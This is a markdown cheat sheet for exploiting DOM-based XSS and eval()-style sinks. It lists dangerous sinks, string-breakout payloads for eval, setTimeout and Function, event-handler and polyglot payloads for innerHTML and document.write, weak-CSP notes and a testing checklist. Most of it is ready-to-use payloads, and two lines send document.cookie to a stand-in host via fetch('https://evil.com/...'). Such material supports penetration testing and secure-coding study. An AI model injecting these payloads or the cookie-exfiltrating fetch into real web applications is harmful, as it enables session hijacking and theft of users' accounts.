
# DOM XSS & `eval()` Exploitation Cheat Sheet

## Common Dangerous DOM Sinks

| Sink               | Example Usage                          | Risk Level |
|--------------------|-----------------------------------------|------------|
| `eval()`           | `eval(location.hash.substr(1))`         | 🔥 High     |
| `document.write()` | `document.write(location.search)`       | 🔥 High     |
| `innerHTML`        | `element.innerHTML = location.hash`     | 🔥 High     |
| `setTimeout()`     | `setTimeout(userInput, 1000)`           | 🔥 High     |
| `Function()`       | `new Function(userInput)`               | 🔥 High     |
| `location.href`    | Redirects using unsanitized input       | ⚠ Medium   |

---

## Payloads for `eval()`, `setTimeout()`, `Function()`

Assuming this pattern:

```javascript
eval("var x = '" + userInput + "'");
```

### Breaking Payloads:
```javascript
'); alert(1); //
"); alert(1); //
'); console.log(document.cookie); //
'); fetch('https://evil.com/?cookie=' + document.cookie); //
```

---

## Payloads for `innerHTML`, `document.write()`

```html
<script>
  document.getElementById("output").innerHTML = location.hash.substr(1);
</script>
```

### Test With:
```
#<img src=x onerror=alert(1)>
#<svg/onload=alert(1)>
#<iframe src=javascript:alert(1)>
#<script>alert(1)</script>
```

---

## payloads for `setTimeout()` / `Function()`

```javascript
setTimeout(userInput, 1000);
new Function(userInput);
```

### Payloads:
```javascript
alert(1)
console.log(document.domain)
fetch('https://evil.com/' + document.cookie)
```

---

## Useful JavaScript for Info Leakage

```javascript
alert(document.domain)
alert(document.cookie)
alert(navigator.userAgent)
alert(window.location)
console.dir(window)
```

---

## Common URL Parameters to Target

```
?search=
#hash
?query=
?next=
```

---

## Polyglot XSS Payloads (work in multiple sinks)

```html
"><svg/onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
```

---

## Weak CSP Bypass Notes

If CSP allows `'unsafe-inline'` and `'unsafe-eval'`:

```http
Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'
```

Then:
- Inline JS works
- eval()/setTimeout() are exploitable
- Script injection is very likely possible

---

## Checklist for DOM XSS

- [ ] Check all parameters reflected into the DOM
- [ ] Check `location`, `hash`, `search`, `referrer`
- [ ] Test all major sinks: `eval`, `innerHTML`, `document.write`, `Function`
- [ ] Use polyglot payloads to identify XSS quickly
- [ ] Review JavaScript and CSP headers